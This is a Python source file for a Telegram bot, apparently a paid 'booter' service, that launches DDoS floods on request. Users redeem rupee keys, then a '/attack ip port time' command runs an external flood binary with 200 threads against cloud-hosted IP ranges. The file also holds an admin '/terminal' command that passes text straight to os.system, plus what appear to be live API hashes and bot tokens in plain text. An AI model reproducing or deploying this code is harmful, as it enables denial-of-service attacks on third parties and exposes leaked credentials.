import asyncio
import json
import os
import random
import string
import time
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import Message

# --------------------[ CONFIGURATION ]----------------------
API_ID = 26512850  # replace with your API ID
API_HASH = "a51477d8c5205718ddec7dd922f36e57"
BOT_TOKEN = "7956357352:AAFRgKDURSeEhUJuh5_spl3j8cAstbpZ9rM"
OWNER_ID = 7916223212  # replace with your Telegram user ID
START_TIME = time.time()

# --------------------[ FILE PATHS ]----------------------
USERS_FILE = "users.json"
ADMINS_FILE = "admins.json"
KEYS_FILE = "keys.json"
CONFIG_FILE = "config.json"
BINARY_PATH = "./gx7"

# --------------------[ Attack Config ]----------------------
ALLOWED_PORT_RANGE = range(10003, 30000)
ALLOWED_IP_PREFIXES = ("20.", "4.", "52.")
BLOCKED_PORTS = {10000, 10001, 10002, 17500, 20000, 20001, 20002, 443}
DEFAULT_THREADS = 200
DEFAULT_MAX_TIME = 240
DATA_PER_SECOND = 0.5  # MB per second

app = Client("spidy_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# --------------------[ UTILS ]----------------------
def load_json(file):
    if not os.path.exists(file):
        with open(file, 'w') as f:
            json.dump({}, f)
    with open(file) as f:
        return json.load(f)

def save_json(file, data):
    with open(file, 'w') as f:
        json.dump(data, f, indent=2)

def get_user(user_id):
    users = load_json(USERS_FILE)
    return users.get(str(user_id), {"balance": 0})

def update_user(user_id, data):
    users = load_json(USERS_FILE)
    users[str(user_id)] = {**get_user(user_id), **data}
    save_json(USERS_FILE, users)

def is_admin(user_id):
    admins = load_json(ADMINS_FILE)
    return str(user_id) in admins

def is_owner(user_id):
    return user_id == OWNER_ID

def log_user(message):
    user = message.from_user
    users = load_json(USERS_FILE)
    if str(user.id) not in users:
        users[str(user.id)] = {"balance": 0}
        save_json(USERS_FILE, users)

def generate_key(amount, custom=None):
    prefix = f"BGMIxDDOS{amount}"
    random_part = custom if custom else ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    key = prefix + random_part
    keys = load_json(KEYS_FILE)
    keys[key] = amount
    save_json(KEYS_FILE, keys)
    return key

# --------------------[ COMMAND HANDLERS ]----------------------
@app.on_message(filters.command("start"))
async def start_handler(_, message):
    log_user(message)
    await message.reply("""
Hello darling, welcome to **Private Attack System Bot** 💻🔥
Use /help to explore all features and commands! 
    """)

@app.on_message(filters.command("help"))
async def help_handler(_, message):
    await message.reply("""
**COMMANDS:**
/attack ip port time – Start Attack 💥
/balance – Check Balance 💰
/genkey {amount} {custom (optional)} – Generate Key (Admin/Owner) 🔑
/redeem {key} – Redeem Key 🎁
/add_admin user_id amount – Add Admin (Owner only) 👑
/remove_admin user_id – Remove Admin (Owner only) 🚫
/admin_list – List Admins (Owner only) 🛠️
/allusers – Show All Users 👥
/myinfo – Show Your Info 📝
/uptime – Bot Uptime ⏳
/ping – Bot Ping 🏓
/broadcast message – Send Broadcast (Admin only) 📣
/threads {amount} – Set Threads (Owner only) ⚙️
/cng_binary – Change Binary (Send File After Command) 🔄
/cng_time {seconds} – Set Max Attack Time (Admin only) ⏱️
/admincmd – Admin Commands 🛠️
/terminal {command} – Terminal Access (Admin only) 💻
/owner – Show Owner 🕴️
    """)

@app.on_message(filters.command("attack"))
async def spidy_handler(_, message: Message):
    log_user(message)
    args = message.text.split()
    if len(args) != 4:
        return await message.reply("Usage: /attack ip port time")

    ip, port, seconds = args[1], int(args[2]), int(args[3])
    user_id = message.from_user.id

    if not ip.startswith(ALLOWED_IP_PREFIXES):
        return await message.reply("Blocked IP range 🚫.")
    if port in BLOCKED_PORTS or port not in ALLOWED_PORT_RANGE:
        return await message.reply("Port is not allowed 🚫.")
    
    config = load_json(CONFIG_FILE)
    threads = config.get("threads", DEFAULT_THREADS)
    max_time = config.get("max_time", DEFAULT_MAX_TIME)

    if seconds > max_time:
        return await message.reply(f"Max attack time is {max_time} seconds ⏱️.")

    user_data = get_user(user_id)
    if user_data.get("balance", 0) < 10 and not is_owner(user_id):
        return await message.reply("Insufficient balance 💸.")

    await message.reply(f"**Attack Started** 💥\nIP: {ip}\nPort: {port}\nTime: {seconds}s\nMethod by Admin @{message.from_user.username or 'Unknown'}")

    process = await asyncio.create_subprocess_exec(BINARY_PATH, ip, str(port), str(seconds), str(threads))
    await asyncio.sleep(seconds)

    data_used = seconds * DATA_PER_SECOND
    if not is_owner(user_id):
        update_user(user_id, {"balance": user_data["balance"] - 10})

    await message.reply(f"**Attack Finished** ✅\nIP: {ip}\nPort: {port}\nTime: {seconds}s\nData Used: {data_used:.2f}MB\nMethod by Admin @{message.from_user.username or 'Unknown'}")

@app.on_message(filters.command("balance"))
async def balance_handler(_, message):
    user = get_user(message.from_user.id)
    await message.reply(f"Your balance: ₹{user.get('balance', 0)} 💰")

@app.on_message(filters.command("genkey"))
async def genkey_handler(_, message):
    if not (is_admin(message.from_user.id) or is_owner(message.from_user.id)):
        return
    args = message.text.split()
    if len(args) < 2:
        return await message.reply("Usage: /genkey amount [custom_key]")
    amount = args[1]
    custom = args[2] if len(args) > 2 else None
    key = generate_key(amount, custom)
    await message.reply(f"Key Generated: `{key}` 🔑")

@app.on_message(filters.command("redeem"))
async def redeem_handler(_, message):
    args = message.text.split()
    if len(args) != 2:
        return await message.reply("Usage: /redeem key")
    key = args[1]
    keys = load_json(KEYS_FILE)
    if key in keys:
        amount = int(keys[key])
        user = get_user(message.from_user.id)
        update_user(message.from_user.id, {"balance": user.get("balance", 0) + amount})
        del keys[key]
        save_json(KEYS_FILE, keys)
        await message.reply(f"Key Redeemed! ₹{amount} added 🎁.")
    else:
        await message.reply("Invalid Key ❌.")

@app.on_message(filters.command("add_admin"))
async def add_admin(_, message):
    if not is_owner(message.from_user.id): return
    args = message.text.split()
    if len(args) != 3: return await message.reply("Usage: /add_admin user_id amount")
    uid, amount = args[1], int(args[2])
    admins = load_json(ADMINS_FILE)
    admins[uid] = amount
    save_json(ADMINS_FILE, admins)
    await message.reply("Admin added 👑.")

@app.on_message(filters.command("remove_admin"))
async def remove_admin(_, message):
    if not is_owner(message.from_user.id): return
    args = message.text.split()
    if len(args) != 2: return await message.reply("Usage: /remove_admin user_id")
    uid = args[1]
    admins = load_json(ADMINS_FILE)
    admins.pop(uid, None)
    save_json(ADMINS_FILE, admins)
    await message.reply("Admin removed 🚫.")

@app.on_message(filters.command("admin_list"))
async def admin_list(_, message):
    if not is_owner(message.from_user.id): return
    admins = load_json(ADMINS_FILE)
    reply = "**Admins:** 👑\n" + "\n".join([f"{k} - ₹{v}" for k, v in admins.items()])
    await message.reply(reply)

@app.on_message(filters.command("allusers"))
async def all_users(_, message):
    if not is_owner(message.from_user.id): return
    users = load_json(USERS_FILE)
    await message.reply(f"**All Users:** 👥 {len(users)}")

@app.on_message(filters.command("myinfo"))
async def my_info(_, message):
    u = message.from_user
    await message.reply(f"Username: @{u.username}\nID: {u.id}\nName: {u.first_name} {u.last_name or ''} 📝")

@app.on_message(filters.command("uptime"))
async def uptime(_, message):
    up = int(time.time() - START_TIME)
    await message.reply(f"Uptime: {up} seconds ⏳")

@app.on_message(filters.command("ping"))
async def ping(_, message):
    start = time.time()
    m = await message.reply("Pinging... 🏓")
    end = time.time()
    await m.edit(f"Pong! {int((end - start) * 1000)} ms")

@app.on_message(filters.command("broadcast"))
async def broadcast(_, message):
    if not is_admin(message.from_user.id): return
    msg = message.text.split(" ", 1)[1]
    users = load_json(USERS_FILE)
    for uid in users:
        try: await app.send_message(int(uid), msg)
        except: pass
    await message.reply("Broadcast complete 📣.")

@app.on_message(filters.command("threads"))
async def set_threads(_, message):
    if not is_owner(message.from_user.id): return
    t = int(message.text.split()[1])
    config = load_json(CONFIG_FILE)
    config["threads"] = t
    save_json(CONFIG_FILE, config)
    await message.reply(f"Threads set to {t} ⚙️")

@app.on_message(filters.command("cng_binary"))
async def change_binary(_, message):
    if not is_owner(message.from_user.id): return
    if message.document:
        file_path = await message.document.download()
        os.rename(file_path, BINARY_PATH)
        await message.reply("Binary updated 🔄")
    else:
        await message.reply("Please send a file after the command to change binary.")

@app.on_message(filters.command("cng_time"))
async def change_time(_, message):
    if not is_admin(message.from_user.id): return
    t = int(message.text.split()[1])
    config = load_json(CONFIG_FILE)
    config["max_time"] = t
    save_json(CONFIG_FILE, config)
    await message.reply(f"Max time set to {t} seconds ⏱️")

@app.on_message(filters.command("admincmd"))
async def admincmd(_, message):
    if not is_owner(message.from_user.id): return
    await message.reply("You are authorized for admin commands 🛠️.")

@app.on_message(filters.command("terminal"))
async def terminal(_, message):
    if not is_admin(message.from_user.id): return
    cmd = message.text.split(" ", 1)[1]
    os.system(cmd)
    await message.reply(f"Executed: {cmd}")

@app.on_message(filters.command("owner"))
async def owner(_, message):
    if not is_owner(message.from_user.id): return
    await message.reply(f"Bot Owner: {OWNER_ID} 🕴️")

# Run the bot
app.run()
